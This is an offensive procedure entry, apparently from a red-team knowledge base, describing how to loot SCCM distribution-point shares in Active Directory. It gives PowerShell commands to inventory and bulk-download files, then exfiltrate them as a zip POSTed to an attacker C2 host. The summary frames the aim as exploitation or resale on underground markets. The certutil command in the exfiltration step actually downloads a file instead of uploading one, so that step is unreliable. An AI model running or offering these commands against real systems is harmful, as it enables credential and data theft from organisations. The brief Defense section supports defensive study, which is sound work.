---
id: 64a3024f-f4ab-457f-83f2-688c74ccac6d
name: Active-Directory-SCCM-Loot-Inventory-and-Download
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:08.280384+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tactics:
  - '[[tactics/Collection|TA0009 - Collection]]'
  - '[[tactics/Discovery|TA0007 - Discovery]]'
  - '[[tactics/Exfiltration|TA0010 - Exfiltration]]'
techniques:
  - '[[techniques/Data-from-Local-System|T1005 - Data from Local System]]'
  - >-
    [[techniques/Exfiltration-Over-Command-and-Control-Channel|T1041 -
    Exfiltration Over Command and Control Channel]]
  - '[[techniques/Network-Share-Discovery|T1135 - Network Share Discovery]]'
sub_techniques: []
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/SCCM Shares]]'
commands:
  - '[[commands/invoke-cm-loot-inventory]]'
  - '[[commands/invoke-cm-loot-download-single-file]]'
  - '[[commands/invoke-cm-loot-download-by-extension]]'
platforms:
  - Windows
tools: []
validated: true
---

# Active-Directory-SCCM-Loot-Inventory-and-Download

## Summary

This procedure exploits accessible SCCM shares in an Active Directory environment to inventory available files and download sensitive data such as software licenses, system configurations, and user-related files. It uses PowerShell cmdlets from the CMLoot module to enumerate and exfiltrate content from SCCM distribution points, enabling attackers to gather valuable intelligence for further exploitation or sale on underground markets.

## Description

SCCM (System Center Configuration Manager) is commonly used in enterprise Windows environments for software deployment, patching, and inventory management. Its shares, such as SCCMContentLib$, often contain unencrypted or weakly protected files including application packages (e.g., MigApp.xml for migration data) and MSI installers with embedded credentials or configs. This procedure assumes the attacker has network access and valid credentials to the SCCM server, allowing enumeration and download without triggering alerts if permissions are domain-user level. The technique maps to MITRE ATT&CK by discovering network shares (T1135), collecting data from them (T1005), and exfiltrating over C2 channels (T1041). Success provides artifacts for lateral movement or persistence planning, with risks including audit log generation on the SCCM server.

## Requirements

1. Network access to the SCCM server (e.g., via VPN or compromised host in the domain).
2. Valid domain credentials with read access to SCCM shares (often low-privilege user suffices).
3. PowerShell execution policy allowing script runs (bypass if needed with -ExecutionPolicy Bypass).
4. CMLoot PowerShell module loaded (import via Import-Module CMLoot).
5. Attacker-controlled C2 server for exfiltration if downloads are staged there.

## Defense

- Restrict SCCM share permissions to authenticated service accounts only, using NTFS ACLs and share-level controls.
- Enable SMB signing and auditing on SCCM servers to log anomalous access patterns.
- Monitor for unusual PowerShell invocations targeting SCCM paths via Sysmon or EDR tools.
- Encrypt sensitive files in SCCM packages and implement DLP rules for exfiltration detection.

## Objectives

1. Enumerate available files in SCCM shares to identify lootable content.
2. Download specific high-value files like application migration data.
3. Bulk-download files by extension (e.g., MSI) for broader data collection.
4. Exfiltrate collected data to attacker control for analysis.

## Instructions

### Step 1: Inventory SCCM Share Files

**Context**: Begin by generating an inventory of downloadable files from the SCCM share to identify sensitive content without downloading everything at once. This step uses the SCCM hostname and outputs a text file listing paths, allowing targeted follow-up.

**Command** ([[commands/invoke-cm-loot-inventory]]):
```powershell
Invoke-CMLootInventory -SCCMHost sccm01.domain.local -Outfile sccmfiles.txt
```

This command connects to the specified SCCM host, enumerates the content library share, and saves a list of file paths to the output file. Run this from a compromised domain-joined host with network line-of-sight to the SCCM server.

### Step 2: Download Specific File (e.g., MigApp.xml)

**Context**: Target a known high-value file like MigApp.xml, which may contain user migration data or credentials. Use the full UNC path from the inventory or prior recon to download it directly to the local system for immediate review or exfil.

**Command** ([[commands/invoke-cm-loot-download-single-file]]):
```powershell
Invoke-CMLootDownload -SingleFile \\sccm\SCCMContentLib$\DataLib\SC100001.1\x86\MigApp.xml
```

This downloads the specified file to the current directory. Verify the path exists via the inventory file; if access denied, escalate privileges or check share permissions.

### Step 3: Bulk Download Files by Extension (e.g., MSI)

**Context**: After inventory, download multiple files matching a pattern, such as all MSI installers which often embed configs or licenses. This is efficient for collecting batches of potentially sensitive packages.

**Command** ([[commands/invoke-cm-loot-download-by-extension]]):
```powershell
Invoke-CMLootDownload -InventoryFile .\sccmfiles.txt -Extension msi
```

This processes the inventory file and downloads only .msi files to a local folder. If no files match, check the inventory for extensions; adjust for other types like .xml or .cab as needed.

### Step 4: Exfiltrate Downloaded Files

**Context**: Stage the looted files for transfer to an external C2 server. Use built-in tools like certutil or BITSAdmin to avoid direct SMB exfil if monitored.

**Command** (Custom exfil example):
```powershell
certutil -urlcache -split -f http://attacker-c2.com/upload.exe upload.exe
# Or for multiple files: Compress and upload via Invoke-WebRequest
Compress-Archive -Path .\sccm-loot\* -DestinationPath loot.zip
Invoke-WebRequest -Uri http://attacker-c2.com/exfil -Method POST -InFile loot.zip
```

This step verifies downloads by checking file sizes/hashes against inventory and sends them outbound. Success confirms data integrity before analysis.
